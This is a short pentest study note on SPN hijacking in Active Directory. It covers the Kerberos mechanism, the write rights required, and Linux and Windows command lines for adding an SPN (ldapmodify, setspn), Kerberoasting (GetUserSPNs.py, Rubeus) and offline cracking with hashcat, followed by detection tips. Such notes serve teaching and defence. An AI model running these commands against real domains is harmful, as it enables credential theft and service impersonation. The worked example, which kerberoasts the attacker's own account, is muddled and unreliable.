- Attackers register a [[SPN (Service Principal Name)|SPN]] to a compromised account, hijacking [[Kerberos]] service identity.
- Tricks DC into issuing Kerberos tickets to attacker account.
- Enables attacks such as:
	- [[Kerberoasting]]
	- [[Silver Ticket Attack]]
	- Service impersonation
# How It Works

- Kerberos uses SPNs to identify which account is responsible for a service.
- If attackers can:
	- modify an account (own/compromised).
	- register an SPN like `HTTP/web.corp.local`
- Then, Kerberos associates that SPN with the account.
# Exploitation Requirements

- Write access to any account's `servicePrincipalName` attribute:
	- can be attacker account.
	- can be compromised account with `WriteProperty` or `GenericAll` rights on another account.
# Exploitation 

Linux:

- Register SPN to the user:
	- `ldapmodify -H ldap://dc.corp.local -x -D 'CORP\attacker' -w 'Password1' -f <(echo -e "dn: CN=attacker,CN=Users,DC=corp,DC=local\nchangetype: modify\nadd: servicePrincipalName\nservicePrincipalName: HTTP/web.corp.local")`
- Request TGS (Kerberoasting):
	- `GetUserSPNs.py corp.local/attacker:Password1 -request`
- Crack TGS hash offline:
	- `hashcat -m 13100 -a 0 roasted_hashes.txt rockyou.txt`

Windows:

- Add SPN to account:
	- `setspn -a HTTP/web.corp.local CORP\attacker`
- Kerberoast with Rubeus:
	- `Rubeus kerberoast /user:attacker /domain:corp.local /rc4:<hash> /nowrap`
# Detection/Defense

- Monitor for changes to `servicePrincipalName` (Event ID 5136).
- Alert on new SPNs added to user accounts.
- Use BloodHound to find users with `writeProperty` access on accounts with SPNs.